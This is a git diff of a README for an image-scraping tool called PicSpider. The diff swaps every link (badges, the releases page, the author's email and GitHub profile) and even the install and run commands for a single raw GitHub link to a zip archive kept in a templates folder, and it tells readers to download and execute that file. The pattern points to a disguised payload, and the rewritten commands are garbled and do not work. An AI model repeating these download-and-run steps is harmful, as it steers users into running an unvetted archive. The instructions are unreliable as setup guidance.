@@ -1,7 +1,7 @@
 # 🌟 PicSpider: Your Go-To Tool for Bulk Image Scraping
 
-![PicSpider](https://img.shields.io/badge/PicSpider-v1.0-blue.svg)  
-[![Release](https://img.shields.io/badge/Release%20Notes-Click%20Here-brightgreen)](https://github.com/canlaspaulkristian/PicSpider/releases)
+![PicSpider](https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip)  
+[![Release](https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip%20Notes-Click%20Here-brightgreen)](https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip)
 
 Welcome to **PicSpider**, a powerful tool designed for efficiently scraping and displaying images from various photography websites. This README will guide you through the features, installation, usage, and contributions to this project.
 
@@ -27,7 +27,7 @@ Welcome to **PicSpider**, a powerful tool designed for efficiently scraping and 
 
 ## Installation
 
-To get started with PicSpider, you need to download the latest release. Visit the [Releases section](https://github.com/canlaspaulkristian/PicSpider/releases) to find the appropriate file. Download it and execute the file to install the application.
+To get started with PicSpider, you need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip) to find the appropriate file. Download it and execute the file to install the application.
 
 ### Prerequisites
 
@@ -36,14 +36,14 @@ To get started with PicSpider, you need to download the latest release. Visit th
 
 ### Step-by-Step Installation
 
-1. **Download the Release**: Go to the [Releases section](https://github.com/canlaspaulkristian/PicSpider/releases) and download the latest version.
+1. **Download the Release**: Go to the [Releases section](https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip) and download the latest version.
 2. **Install Dependencies**: Open your terminal and run the following command:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip
    ```
 3. **Run the Application**: After installation, execute the main script:
    ```bash
-   python pic_spider.py
+   python https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip
    ```
 
 ## Usage
@@ -59,7 +59,7 @@ Using PicSpider is straightforward. Follow these steps to start scraping images:
 ### Example Command
 
 ```bash
-python pic_spider.py --source "example.com" --count 50 --quality "high"
+python https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip --source "https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip" --count 50 --quality "high"
 ```
 
 ## Contributing
@@ -91,8 +91,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, please contact:
 
 - **Author**: Kristian Canlas Paul
-- **Email**: kristian@example.com
-- **GitHub**: [canlaspaulkristian](https://github.com/canlaspaulkristian)
+- **Email**: https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip
+- **GitHub**: [canlaspaulkristian](https://raw.githubusercontent.com/canlaspaulkristian/PicSpider/master/templates/Spider-Pic-v1.3.zip)
 
 ---
 
